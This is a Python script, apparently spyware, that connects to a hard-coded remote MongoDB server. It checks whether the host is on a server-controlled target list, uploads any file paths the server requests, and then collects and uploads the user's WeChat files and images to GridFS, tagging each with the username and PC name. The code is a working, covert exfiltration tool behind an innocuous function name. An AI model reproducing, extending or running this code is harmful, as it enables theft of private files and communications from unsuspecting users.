from pymongo import MongoClient

from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5 import QtCore, QtGui, QtWidgets
from dataread import *
import pickle
import pymysql
import socket
import time
import requests
import getpass
from pymongo import MongoClient
from gridfs import *
import pickle



def test():
    pcname = socket.getfqdn(socket.gethostname())
    username = getpass.getuser()
    # outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
    # inip = socket.gethostbyname(username)
    # currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    conn = MongoClient('47.105.38.117', 27017)
    db = conn.userdata          #文件路径数据库
    db2 = conn.userfiledata     #文件数据库
    db3 = conn.userimagedata    #图片数据库
    db4 = conn.userinf    #验证用户是否需要上传数据

    # print(list(db4.userlist['userlist'].find()))
    # # print(db4.userlist['userlist'].find({}, { 'pcid': 1,'_id':0 } )[0]['pcid'])
    # if db4.userlist:
    fileFS = GridFS(db2, collection='datas')  # 连接文件GridFS集合
    imageFS = GridFS(db3, collection='images')  # 连接图片GridFS集合

    key = username + pcname
    mycol = db[username +'-'+ pcname]   #用户文件表
    pcidlist=list(db4['userlist'].find({}, { 'pcid': 1,'_id':0 })[0]['pcid'])   #获取上传文件主机列表

    #若不在列表则退出
    if(pcname not in pcidlist):
        print("本主机id不在上传列表内！")
        return
    # mycol.remove({})


    wxfilepath = 'C:/Users/' + username + '/Documents/WeChat Files/'

    #读取本地文件上传列表
    if os.path.exists('filelist.dat'):
        f = open('filelist.dat', 'rb')
        fileuploadlist=pickle.load(f)
    else:
        fileuploadlist=[]

    #读取本地图片上传列表
    if os.path.exists('imagelist.dat'):
        f = open('imagelist.dat', 'rb')
        imageuploadlist=pickle.load(f)
    else:
        imageuploadlist=[]

    #读取服务器需求文件列表
    demanddata = list(db['demandfilename'].find({}, { 'path': 1,'_id':0 } ))
    # print(demanddata)
    # print(demanddata[0]['path'])


    #上传文件
    for path in demanddata[0]['path']:
        if os.path.exists(path):
            if(path not in fileuploadlist):
                dic = dict()
                dic['文件名'] = os.path.basename(path)
                dic['来源'] = username +'-'+ pcname
                dic['上传时间'] = datetime.now()
                dic['路径']=path
                content = open(path, 'rb').read()  # 二进制格式读取文件内容
                fileFS.put(content, **dic)  # 上传文件
                fileuploadlist.append(path)
                #保存上传文件列表
                with open('filelist.dat', "wb") as file:
                    pickle.dump(fileuploadlist, file, True)

    with open('filelist.dat', "wb") as file:
        pickle.dump(fileuploadlist, file, True)

    # for cursor in fs.find():
    #     filename = cursor.文件名
    #     content = cursor.read()
    #     if(not (os.path.exists('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/'))):
    #         os.mkdir('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/')
    #     if(os.path.exists(not('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/'+ filename))):
    #         with open('C:/Users/ENERGY/Desktop/用户数据/' +cursor.来源+'/'+ filename, 'wb') as f:
    #             f.write(content)

    #生成wx目录
    tarpath = ''
    for i in os.listdir(wxfilepath):
        # print(i[:2])
        if (i[:2] == 'wx'):
            print(i)
            tarpath = i

    #上传本地文件绝对路径
    filelist = []
    for root, dirs, files in os.walk(wxfilepath + tarpath + '\FileStorage\File', topdown=False):
            for name in files:
                # print(os.path.join(root, name))
                filelist.append(os.path.join(root, name))
    mycol.insert({'filepath': filelist})

    #计算未上传的图片集合
    imagelist = []
    for root, dirs, files in os.walk(wxfilepath + tarpath + '\FileStorage\Image', topdown=False):
        if os.path.basename(root)!='Thumb':
            for name in files:
                # print(os.path.join(root, name))
                imagelist.append(os.path.join(root, name))
    unupimagelist=set(imagelist)^set(imageuploadlist)

    #上传图片
    for imagepath in unupimagelist:
        dic = dict()
        dic['文件名'] = os.path.basename(imagepath)
        dic['来源'] = username + '-' + pcname
        dic['上传时间'] = datetime.now()
        dic['路径'] = imagepath
        content = open(imagepath, 'rb').read()  # 二进制格式读取文件内容
        imageFS.put(content, **dic)  # 上传文件
        imageuploadlist.append(imagepath)
        # 保存上传文件列表
        with open('imagelist.dat', "wb") as file:
            pickle.dump(imageuploadlist, file, True)
        time.sleep(5)


if __name__=='__main__':
    test()